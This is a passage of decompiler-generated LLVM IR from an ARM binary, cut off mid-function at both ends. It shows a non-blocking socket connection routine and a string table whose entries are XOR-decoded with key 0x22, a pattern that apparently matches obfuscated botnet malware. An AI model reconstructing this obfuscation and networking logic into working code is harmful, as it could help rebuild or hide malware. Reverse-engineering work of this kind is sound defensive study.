dec_label_pc_fd80:                                ; preds = %dec_label_pc_fd0c, %dec_label_pc_fd24
  %v0_fd80 = load i32, i32* @r7, align 4
  %v1_fd80 = add i32 %v0_fd80, 9
  %v2_fd80 = inttoptr i32 %v1_fd80 to i8*
  %v3_fd80 = load i8, i8* %v2_fd80, align 1
  %v4_fd80 = zext i8 %v3_fd80 to i32
  store i32 %v4_fd80, i32* %r3.global-to-local, align 4
  %v1_fd84 = add i32 %v0_fd80, 8
  %v2_fd84 = inttoptr i32 %v1_fd84 to i8*
  %v3_fd84 = load i8, i8* %v2_fd84, align 1
  %v4_fd84 = zext i8 %v3_fd84 to i32
  %v4_fd88 = mul nuw nsw i32 %v4_fd80, 256
  %v5_fd88 = or i32 %v4_fd84, %v4_fd88
  store i32 %v5_fd88, i32* %r0.global-to-local, align 4
  %v1_fd8c = call i32 @function_149f4(i32 %v5_fd88)
  store i32 %v1_fd8c, i32* %r0.global-to-local, align 4
  %v1_fd90 = load i32, i32* @r8, align 4
  %v2_fd90 = add i32 %v1_fd90, %v1_fd8c
  br label %dec_label_pc_fbd4.backedge

; uselistorder directives
  uselistorder i32 %v10_fd60, { 1, 0, 2 }
  uselistorder i32 %v3_fd58, { 1, 0 }
  uselistorder i32 %v2_fce8, { 1, 0 }
  uselistorder i32 %v3_fc68, { 0, 2, 1 }
  uselistorder i32 %v1_fce865, { 1, 0 }
  uselistorder i32 %v1_fce4, { 1, 2, 0 }
  uselistorder i32 %v2_fcd8, { 1, 0 }
  uselistorder i32 %v3_fbf4, { 0, 2, 1 }
  uselistorder i32 %v1_fcd849, { 1, 0 }
  uselistorder i32 %v1_fcd4, { 1, 2, 0 }
  uselistorder i1 %v7_fbdc, { 1, 0 }
  uselistorder i32 %v1_fbd4, { 1, 0 }
  uselistorder i32 %storemerge29, { 1, 0 }
  uselistorder i32 %v3_fc90, { 0, 2, 1 }
  uselistorder i32 %v2_fc8c, { 1, 2, 0 }
  uselistorder i32 %v0_fce0, { 2, 0, 1 }
  uselistorder i32 %v1_fce8, { 1, 2, 0 }
  uselistorder i32 %v3_fc7028, { 1, 0 }
  uselistorder i32 %v3_fc6826, { 1, 0, 2 }
  uselistorder i32 %v0_fcac, { 1, 0, 3, 2 }
  uselistorder i32 %v0_fc54, { 1, 0, 2 }
  uselistorder i32 %v3_fc1c, { 0, 2, 1 }
  uselistorder i32 %v2_fc18, { 1, 2, 0 }
  uselistorder i32 %v0_fcd0, { 2, 0, 1 }
  uselistorder i32 %v1_fcd8, { 1, 2, 0 }
  uselistorder i32 %v3_fbfc22, { 1, 0 }
  uselistorder i32 %v3_fbf420, { 1, 0, 2 }
  uselistorder i32 %v0_fbe8, { 3, 0, 2, 1 }
  uselistorder i1 %v7_fbdc140, { 1, 0 }
  uselistorder i32 %v1_fbd4133, { 1, 0 }
  uselistorder i1 %v9_fbb4, { 1, 0 }
  uselistorder i32 %v0_fb74, { 1, 0 }
  uselistorder i32 %v0_fb68, { 1, 0, 2 }
  uselistorder i32 %v0_fb58, { 1, 0 }
  uselistorder i32 %v0_fb30, { 1, 0 }
  uselistorder i1 %v7_fadc, { 1, 0 }
  uselistorder i32 %v5_fad8, { 1, 0, 2 }
  uselistorder i32 %v1_faa0, { 1, 0 }
  uselistorder i32 %v3_fa8c, { 1, 0 }
  uselistorder i32 %v0_fa84, { 1, 0 }
  uselistorder i32 %v1_fa78, { 1, 2, 0 }
  uselistorder i1 %v7_fa30, { 1, 0 }
  uselistorder i32 %v4_fa2c, { 1, 0, 2 }
  uselistorder i1 %v7_fa14, { 1, 0 }
  uselistorder i32 %v3_fa10, { 1, 0, 2 }
  uselistorder i1 %v7_f9f8, { 1, 0 }
  uselistorder i32 %v3_f9f4, { 2, 1, 0, 3 }
  uselistorder i1 %v7_f9dc, { 2, 1, 0 }
  uselistorder i32 %v1_f9e0, { 1, 0 }
  uselistorder i32 %v2_fa90, { 1, 0, 2 }
  uselistorder i32 %v2_fa6c, { 1, 0, 2 }
  uselistorder i32 %v1_f9c8, { 1, 0 }
  uselistorder i32 %v2_f958, { 1, 0, 2, 3 }
  uselistorder i32 %v6_f944, { 1, 2, 0 }
  uselistorder i64 %v5_f940, { 0, 2, 1 }
  uselistorder i32 %v1_f92c, { 1, 0, 2 }
  uselistorder i32 %v1_f8e4, { 1, 0 }
  uselistorder i32 %v1_f8e0, { 1, 2, 0 }
  uselistorder i32 %v2_f8dc, { 1, 0 }
  uselistorder i1 %v8_f8c8, { 1, 0 }
  uselistorder i32 %v2_f8a0, { 1, 0, 2 }
  uselistorder i16* %stack_var_-2244, { 1, 0 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i16* %stack_var_-4292, { 1, 0 }
  uselistorder i16 %tmp78, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 13, 9, 10, 11, 12, 14, 31, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 30, 28, 29, 32 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 6, 8, 5, 0, 7, 21, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 6, 8, 5, 1, 7, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 21, 22, 19 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 5, 10, 7, 8, 9, 15, 12, 11, 13, 14, 19, 16, 17, 18, 22, 20, 21, 23, 26, 24, 25, 27, 30, 28, 29, 31, 33, 32, 35, 34, 36, 37, 38, 41, 40, 39, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 10, 4, 15, 5, 6, 16, 7, 8, 9, 1, 11, 12, 13, 14, 37, 35, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0, 26, 27, 28, 29, 34, 31, 32, 30, 33, 36 }
  uselistorder i32 (i32)* @function_15c0c, { 8, 7, 6, 4, 3, 2, 5, 1, 0 }
  uselistorder label %dec_label_pc_fd80, { 1, 0 }
  uselistorder label %dec_label_pc_fc68.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_fbf4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_fbd4.backedge, { 1, 0 }
  uselistorder label %bb121, { 1, 0 }
  uselistorder label %dec_label_pc_fc78, { 1, 0 }
  uselistorder label %dec_label_pc_fc78.preheader, { 1, 0 }
  uselistorder label %bb119, { 1, 0 }
  uselistorder label %dec_label_pc_fc04, { 1, 0 }
  uselistorder label %dec_label_pc_fc04.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_fbe8, { 1, 0 }
  uselistorder label %dec_label_pc_fb74, { 1, 0 }
  uselistorder label %dec_label_pc_fb60, { 5, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_fb40, { 2, 1, 4, 0, 3 }
  uselistorder label %bb117, { 1, 0 }
  uselistorder label %bb114, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_f8c0, { 1, 0 }
}

define i32 @function_fd98(i32 %arg1) local_unnamed_addr {
dec_label_pc_fd98:
  %v2_fda4 = load i32, i32* @global_var_22930.192, align 4
  store i32 %v2_fda4, i32* @r0, align 4
  %v2_fdac = call i32 @function_14dd8(i32 %v2_fda4, i32 9)
  ret i32 %v2_fdac

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_14dd8, { 13, 10, 9, 12, 11, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @function_fdc0() local_unnamed_addr {
dec_label_pc_fdc0:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_fdc0 = load i32, i32* @r4, align 4
  store i32 %v3_fdc0, i32* %stack_var_-16, align 4
  %v6_fdc0 = load i32, i32* @r5, align 4
  %v9_fdc0 = load i32, i32* @r6, align 4
  %v12_fdc0 = load i32, i32* @lr, align 4
  %v0_fdc4 = load i32, i32* @r0, align 4
  store i32 %v0_fdc4, i32* @r5, align 4
  %v1_fdc8 = add i32 %v0_fdc4, 4
  %v2_fdc8 = inttoptr i32 %v1_fdc8 to i32*
  %v3_fdc8 = load i32, i32* %v2_fdc8, align 4
  store i32 %v3_fdc8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 65004, i32* @lr, align 4
  %v1_fde8 = icmp ne i32 %v3_fdc8, -1
  call void @__pseudo_cond_branch(i1 %v1_fde8, i32 ptrtoint (i32* @global_var_15b20.24 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_fdf4 = load i32, i32* @r6, align 4
  store i32 %v0_fdf4, i32* %r2.global-to-local, align 4
  %v3_fdf8 = call i32 @function_14b54(i32 2, i32 1, i32 %v0_fdf4)
  store i32 %v3_fdf8, i32* %r0.global-to-local, align 4
  %v7_fdfc = icmp eq i32 %v3_fdf8, -1
  %v1_fe00 = load i32, i32* @r5, align 4
  %v2_fe00 = add i32 %v1_fe00, 4
  %v3_fe00 = inttoptr i32 %v2_fe00 to i32*
  store i32 %v3_fdf8, i32* %v3_fe00, align 4
  br i1 %v7_fdfc, label %dec_label_pc_fdc0.dec_label_pc_fe78_crit_edge, label %dec_label_pc_fe08

dec_label_pc_fdc0.dec_label_pc_fe78_crit_edge:    ; preds = %dec_label_pc_fdc0
  %v1_fe80.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fe78

dec_label_pc_fe08:                                ; preds = %dec_label_pc_fdc0
  %v2_fdcc = ptrtoint i32* %stack_var_-32 to i32
  %v0_fe08 = load i32, i32* @r5, align 4
  %v1_fe08 = add i32 %v0_fe08, 28
  store i32 %v1_fe08, i32* %r0.global-to-local, align 4
  %v0_fe0c = load i32, i32* @r6, align 4
  %v2_fe0c = add i32 %v0_fe08, 24
  %v3_fe0c = inttoptr i32 %v2_fe0c to i32*
  store i32 %v0_fe0c, i32* %v3_fe0c, align 4
  %v2_fe14 = call i32 @function_123b8(i32 %v1_fe08, i32 256)
  store i32 %v2_fe14, i32* %r0.global-to-local, align 4
  %v0_fe18 = load i32, i32* @r5, align 4
  %v1_fe18 = add i32 %v0_fe18, 4
  %v2_fe18 = inttoptr i32 %v1_fe18 to i32*
  %v3_fe18 = load i32, i32* %v2_fe18, align 4
  store i32 %v3_fe18, i32* @r4, align 4
  %v0_fe1c = load i32, i32* @r6, align 4
  store i32 %v0_fe1c, i32* %r2.global-to-local, align 4
  store i32 %v3_fe18, i32* %r0.global-to-local, align 4
  %v3_fe28 = call i32 @function_12f68(i32 %v3_fe18, i32 3, i32 %v0_fe1c)
  %v1_fe30 = or i32 %v3_fe28, 2048
  store i32 %v1_fe30, i32* %r2.global-to-local, align 4
  %v0_fe34 = load i32, i32* @r4, align 4
  store i32 %v0_fe34, i32* %r0.global-to-local, align 4
  %v3_fe38 = call i32 @function_12f68(i32 %v0_fe34, i32 4, i32 %v1_fe30)
  store i32 %v3_fe38, i32* %r0.global-to-local, align 4
  %v2_fe40 = load i32, i32* @global_var_22398.194, align 4
  store i32 %v2_fe40, i32* %r2.global-to-local, align 4
  %v1_fe48 = load i32, i32* @r5, align 4
  %v2_fe48 = add i32 %v1_fe48, 12
  %v3_fe48 = inttoptr i32 %v2_fe48 to i32*
  store i32 1, i32* %v3_fe48, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_fe54 = load i32, i32* %r2.global-to-local, align 4
  %v1_fe54 = load i32, i32* @r5, align 4
  %v2_fe54 = add i32 %v1_fe54, 8
  %v3_fe54 = inttoptr i32 %v2_fe54 to i32*
  store i32 %v0_fe54, i32* %v3_fe54, align 4
  %v0_fe58 = load i32, i32* @r5, align 4
  %v1_fe5c = add i32 %v0_fe58, 4
  %v2_fe5c = inttoptr i32 %v1_fe5c to i32*
  %v3_fe5c = load i32, i32* %v2_fe5c, align 4
  store i32 %v3_fe5c, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_fe74 = call i32 @function_14798(i32 %v3_fe5c, i32 %v2_fdcc, i32 16)
  store i32 %v3_fe74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fe78

dec_label_pc_fe78:                                ; preds = %dec_label_pc_fdc0.dec_label_pc_fe78_crit_edge, %dec_label_pc_fe08
  %v1_fe80 = phi i32 [ %v1_fe80.pre, %dec_label_pc_fdc0.dec_label_pc_fe78_crit_edge ], [ %v3_fe74, %dec_label_pc_fe08 ]
  %v2_fe7c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_fe7c, i32* @r4, align 4
  store i32 %v6_fdc0, i32* @r5, align 4
  store i32 %v9_fdc0, i32* @r6, align 4
  store i32 %v12_fdc0, i32* @lr, align 4
  ret i32 %v1_fe80

; uselistorder directives
  uselistorder i32 %v3_fdf8, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 6, 5, 9, 10, 8, 7 }
  uselistorder i32 (i32, i32)* @function_123b8, { 10, 12, 16, 15, 14, 13, 9, 8, 7, 11, 6, 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_fe78, { 1, 0 }
}

define i32 @function_fe88(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_fe88:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_fe88 = load i32, i32* @r4, align 4
  %v6_fe88 = load i32, i32* @r5, align 4
  %v9_fe88 = load i32, i32* @r6, align 4
  %v12_fe88 = load i32, i32* @r7, align 4
  %v15_fe88 = load i32, i32* @r8, align 4
  %v18_fe88 = load i32, i32* @sb, align 4
  %v21_fe88 = load i32, i32* @sl, align 4
  %v24_fe88 = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_22364.196 to i32), i32* @fp, align 4
  %v2_fe90 = load i32, i32* @global_var_22364.196, align 4
  store i32 ptrtoint (i32* @global_var_22390.198 to i32), i32* @sl, align 4
  %v1_fe9c = add i32 %v2_fe90, 1
  store i32 %v1_fe9c, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_fea8 = load i32, i32* @global_var_22390.198, align 4
  store i32 %v2_fea8, i32* %r0.global-to-local, align 4
  %v3_feac = mul i32 %v1_fe9c, 16
  store i32 %v3_feac, i32* %r1.global-to-local, align 4
  %v4_feb4 = call i32 @function_143c8(i32 %v2_fea8, i32 %v3_feac, i32 %arg3, i32 %v1_fe9c)
  %v2_feb8 = load i32, i32* @global_var_22364.196, align 4
  store i32 %v2_feb8, i32* %r2.global-to-local, align 4
  store i32 %v4_feb4, i32* @r8, align 4
  %v0_fec0 = load i32, i32* @r5, align 4
  store i32 %v0_fec0, i32* %r0.global-to-local, align 4
  %v1_fec8 = load i32, i32* @sl, align 4
  %v2_fec8 = inttoptr i32 %v1_fec8 to i32*
  store i32 %v4_feb4, i32* %v2_fec8, align 4
  %v1_fecc = inttoptr i32 %v0_fec0 to i8*
  %v2_fecc = call i32 @function_12324(i8* %v1_fecc)
  %sext = mul i32 %v2_fecc, 16777216
  %v1_fed0 = sdiv i32 %sext, 16777216
  %v2_fed0 = add nsw i32 %v1_fed0, 1
  store i32 %v2_fed0, i32* @r4, align 4
  store i32 %v1_fed0, i32* @r7, align 4
  store i32 %v2_fed0, i32* @r0, align 4
  %v0_fedc = call i32 @function_13c7c()
  store i32 %v0_fedc, i32* %r0.global-to-local, align 4
  %v0_fee0 = load i32, i32* @r5, align 4
  store i32 %v0_fee0, i32* %r1.global-to-local, align 4
  %v0_fee4 = load i32, i32* @r4, align 4
  store i32 %v0_fee4, i32* %r2.global-to-local, align 4
  store i32 %v0_fedc, i32* %r6.global-to-local, align 4
  %v3_feec = call i32 @function_12394(i32 %v0_fedc, i32 %v0_fee0, i32 %v0_fee4)
  store i32 %v3_feec, i32* %r0.global-to-local, align 4
  %v0_fef0 = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_fef0, 1
  %extract.t6 = trunc i32 %v0_fef0 to i8
  br i1 %tmp22, label %dec_label_pc_ff14, label %dec_label_pc_fef8

dec_label_pc_fef8:                                ; preds = %dec_label_pc_fe88
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fefc

dec_label_pc_fefc:                                ; preds = %dec_label_pc_fefc, %dec_label_pc_fef8
  %v2_ff04 = phi i32 [ %v1_ff08, %dec_label_pc_fefc ], [ 0, %dec_label_pc_fef8 ]
  %v1_fefc = load i32, i32* %r6.global-to-local, align 4
  %v2_fefc = add i32 %v1_fefc, %v2_ff04
  %v3_fefc = inttoptr i32 %v2_fefc to i8*
  %v4_fefc = load i8, i8* %v3_fefc, align 1
  %v6_fefc = zext i8 %v4_fefc to i32
  %v1_ff00 = xor i32 %v6_fefc, 34
  store i32 %v1_ff00, i32* %r3.global-to-local, align 4
  %v1_ff04 = trunc i32 %v1_ff00 to i8
  store i8 %v1_ff04, i8* %v3_fefc, align 1
  %v0_ff08 = load i32, i32* %r2.global-to-local, align 4
  %v1_ff08 = add i32 %v0_ff08, 1
  store i32 %v1_ff08, i32* %r2.global-to-local, align 4
  %v1_ff0c = load i32, i32* @r7, align 4
  %v9_ff0c = icmp eq i32 %v1_ff08, %v1_ff0c
  br i1 %v9_ff0c, label %dec_label_pc_ff14.loopexit, label %dec_label_pc_fefc

dec_label_pc_ff14.loopexit:                       ; preds = %dec_label_pc_fefc
  %extract.t = trunc i32 %v1_ff08 to i8
  br label %dec_label_pc_ff14

dec_label_pc_ff14:                                ; preds = %dec_label_pc_ff14.loopexit, %dec_label_pc_fe88
  %v0_ff24.off0 = phi i8 [ %extract.t, %dec_label_pc_ff14.loopexit ], [ %extract.t6, %dec_label_pc_fe88 ]
  %v2_ff14 = load i32, i32* @global_var_22364.196, align 4
  %v2_ff18 = load i32, i32* @global_var_22390.198, align 4
  %v3_ff1c = mul i32 %v2_ff14, 16
  store i32 %v3_ff1c, i32* @sb, align 4
  %v2_ff20 = add i32 %v2_ff18, %v3_ff1c
  store i32 %v2_ff20, i32* %r2.global-to-local, align 4
  %v3_ff24 = add i32 %v2_ff20, 12
  %v4_ff24 = inttoptr i32 %v3_ff24 to i8*
  store i8 %v0_ff24.off0, i8* %v4_ff24, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_feb8, i32* %r3.global-to-local, align 4
  %v0_ff30 = load i32, i32* %r6.global-to-local, align 4
  %v1_ff30 = load i32, i32* @r8, align 4
  %v5_ff30 = mul i32 %v2_feb8, 16
  %v6_ff30 = add i32 %v1_ff30, %v5_ff30
  %v7_ff30 = inttoptr i32 %v6_ff30 to i32*
  store i32 %v0_ff30, i32* %v7_ff30, align 4
  %v2_ff34 = load i32, i32* @global_var_22390.198, align 4
  store i32 %v2_ff34, i32* @r7, align 4
  %v1_ff38 = inttoptr i32 %arg2 to i8*
  %v2_ff38 = call i32 @function_12324(i8* %v1_ff38)
  %sext1 = mul i32 %v2_ff38, 16777216
  %v1_ff3c = sdiv i32 %sext1, 16777216
  %v2_ff3c = add nsw i32 %v1_ff3c, 1
  store i32 %v2_ff3c, i32* @r4, align 4
  store i32 %v1_ff3c, i32* @r6, align 4
  store i32 %v2_ff3c, i32* @r0, align 4
  %v0_ff48 = call i32 @function_13c7c()
  store i32 %v0_ff48, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_ff50 = load i32, i32* @r4, align 4
  store i32 %v0_ff50, i32* %r2.global-to-local, align 4
  store i32 %v0_ff48, i32* %r5.global-to-local, align 4
  %v3_ff58 = call i32 @function_12394(i32 %v0_ff48, i32 %arg2, i32 %v0_ff50)
  store i32 %v3_ff58, i32* %r0.global-to-local, align 4
  %v0_ff5c = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_ff5c, 1
  %extract.t8 = trunc i32 %v0_ff5c to i8
  br i1 %tmp23, label %dec_label_pc_ff80, label %dec_label_pc_ff64

dec_label_pc_ff64:                                ; preds = %dec_label_pc_ff14
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ff68

dec_label_pc_ff68:                                ; preds = %dec_label_pc_ff68, %dec_label_pc_ff64
  %v2_ff70 = phi i32 [ %v1_ff74, %dec_label_pc_ff68 ], [ 0, %dec_label_pc_ff64 ]
  %v1_ff68 = load i32, i32* %r5.global-to-local, align 4
  %v2_ff68 = add i32 %v1_ff68, %v2_ff70
  %v3_ff68 = inttoptr i32 %v2_ff68 to i8*
  %v4_ff68 = load i8, i8* %v3_ff68, align 1
  %v6_ff68 = zext i8 %v4_ff68 to i32
  %v1_ff6c = xor i32 %v6_ff68, 34
  store i32 %v1_ff6c, i32* %r3.global-to-local, align 4
  %v1_ff70 = trunc i32 %v1_ff6c to i8
  store i8 %v1_ff70, i8* %v3_ff68, align 1
  %v0_ff74 = load i32, i32* %r2.global-to-local, align 4
  %v1_ff74 = add i32 %v0_ff74, 1
  store i32 %v1_ff74, i32* %r2.global-to-local, align 4
  %v1_ff78 = load i32, i32* @r6, align 4
  %v9_ff78 = icmp eq i32 %v1_ff74, %v1_ff78
  br i1 %v9_ff78, label %dec_label_pc_ff80.loopexit, label %dec_label_pc_ff68

dec_label_pc_ff80.loopexit:                       ; preds = %dec_label_pc_ff68
  %extract.t7 = trunc i32 %v1_ff74 to i8
  br label %dec_label_pc_ff80

dec_label_pc_ff80:                                ; preds = %dec_label_pc_ff80.loopexit, %dec_label_pc_ff14
  %v0_ff90.off0 = phi i8 [ %extract.t7, %dec_label_pc_ff80.loopexit ], [ %extract.t8, %dec_label_pc_ff14 ]
  %v2_ff80 = load i32, i32* @global_var_22364.196, align 4
  store i32 %v2_ff80, i32* %r0.global-to-local, align 4
  %v2_ff84 = load i32, i32* @global_var_22390.198, align 4
  %v3_ff88 = mul i32 %v2_ff80, 16
  store i32 %v3_ff88, i32* %r1.global-to-local, align 4
  %v2_ff8c = or i32 %v3_ff88, 13
  %v3_ff90 = add i32 %v2_ff8c, %v2_ff84
  %v4_ff90 = inttoptr i32 %v3_ff90 to i8*
  store i8 %v0_ff90.off0, i8* %v4_ff90, align 1
  store i32 ptrtoint (i16** @global_var_22394.200 to i32), i32* %r4.global-to-local, align 4
  %v2_ff9c = load i16, i16* bitcast (i16** @global_var_22394.200 to i16*), align 4
  %v3_ff9c = zext i16 %v2_ff9c to i32
  store i32 %v3_ff9c, i32* %lr.global-to-local, align 4
  %v2_ffa4 = load i32, i32* @global_var_22390.198, align 4
  store i32 %v2_ffa4, i32* %r2.global-to-local, align 4
  %v0_ffac = load i32, i32* %r1.global-to-local, align 4
  %v2_ffac = add i32 %v0_ffac, %v2_ffa4
  store i32 %v2_ffac, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_22394.200 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_ffb4 = load i32, i32* @sb, align 4
  %v1_ffb4 = load i32, i32* @r7, align 4
  %v2_ffb4 = add i32 %v1_ffb4, %v0_ffb4
  store i32 %v2_ffb4, i32* %ip.global-to-local, align 4
  %v0_ffb8 = load i32, i32* %r0.global-to-local, align 4
  %v1_ffb8 = add i32 %v0_ffb8, 1
  store i32 %v1_ffb8, i32* %r0.global-to-local, align 4
  %v3_ffbc = add i32 %v2_ffac, 10
  %v4_ffbc = inttoptr i32 %v3_ffbc to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_22394.200 to i32), i32 16), i32 16) to i16), i16* %v4_ffbc, align 2
  %v0_ffc0 = load i32, i32* %lr.global-to-local, align 4
  %v1_ffc0 = trunc i32 %v0_ffc0 to i16
  %v2_ffc0 = load i32, i32* %r1.global-to-local, align 4
  %v3_ffc0 = add i32 %v2_ffc0, 8
  %v4_ffc0 = inttoptr i32 %v3_ffc0 to i16*
  store i16 %v1_ffc0, i16* %v4_ffc0, align 2
  %v0_ffc4 = load i32, i32* %r5.global-to-local, align 4
  %v1_ffc4 = load i32, i32* %ip.global-to-local, align 4
  %v2_ffc4 = add i32 %v1_ffc4, 4
  %v3_ffc4 = inttoptr i32 %v2_ffc4 to i32*
  store i32 %v0_ffc4, i32* %v3_ffc4, align 4
  %v1_ffc8 = load i32, i32* @fp, align 4
  %v2_ffc8 = inttoptr i32 %v1_ffc8 to i32*
  store i32 %v1_ffb8, i32* %v2_ffc8, align 4
  %v0_ffcc = load i32, i32* %r3.global-to-local, align 4
  %v1_ffcc = trunc i32 %v0_ffcc to i16
  %v2_ffcc = load i32, i32* %r4.global-to-local, align 4
  %v3_ffcc = inttoptr i32 %v2_ffcc to i16*
  store i16 %v1_ffcc, i16* %v3_ffcc, align 2
  store i32 %v3_fe88, i32* @r4, align 4
  store i32 %v6_fe88, i32* @r5, align 4
  store i32 %v9_fe88, i32* @r6, align 4
  store i32 %v12_fe88, i32* @r7, align 4
  store i32 %v15_fe88, i32* @r8, align 4
  store i32 %v18_fe88, i32* @sb, align 4
  store i32 %v21_fe88, i32* @sl, align 4
  store i32 %v24_fe88, i32* @fp, align 4
  ret i32 %v1_ffb8

; uselistorder directives
  uselistorder i32 %v3_ff88, { 1, 0 }
  uselistorder i32 %v1_ff74, { 0, 2, 3, 1 }
  uselistorder i32 %v0_ff48, { 1, 0, 2 }
  uselistorder i32 %v3_ff1c, { 1, 0 }
  uselistorder i32 %v1_ff08, { 0, 2, 3, 1 }
  uselistorder i32 %v0_fedc, { 1, 0, 2 }
  uselistorder i32 %v2_feb8, { 1, 0, 2 }
  uselistorder i32 %v3_feac, { 1, 0 }
  uselistorder i32 %v1_fe9c, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i8*)* @function_12324, { 27, 28, 8, 9, 10, 11, 12, 0, 1, 2, 3, 4, 5, 6, 7, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 84, 85, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83 }
  uselistorder i32 (i32, i32, i32, i32)* @function_143c8, { 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @function_ffe8() local_unnamed_addr {
dec_label_pc_ffe8:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp273 = call i32 @__decompiler_undefined_function_0()
  %tmp274 = call i32 @__decompiler_undefined_function_0()
  %tmp275 = call i16 @__decompiler_undefined_function_1()
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_fff4 = call i32 @function_14c4c()
  store i32 %v0_fff4, i32* %r0.global-to-local, align 4
  %v7_fff8 = icmp eq i32 %v0_fff4, -1
  %. = zext i1 %v7_fff8 to i32
  %tmp308 = icmp slt i32 %v0_fff4, 1
  %storemerge268 = select i1 %tmp308, i32 %., i32 1
  store i32 %storemerge268, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_22930.192 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10014 = icmp eq i32 %storemerge268, 0
  store i1 %v2_10014, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_fff4, i32* @global_var_22930.192, align 4
  br i1 %v2_10014, label %dec_label_pc_10030, label %dec_label_pc_10020

dec_label_pc_10020:                               ; preds = %dec_label_pc_ffe8
  ret i32 %v0_fff4

dec_label_pc_10030:                               ; preds = %dec_label_pc_ffe8
  %v0_10030 = call i32 @function_125e0()
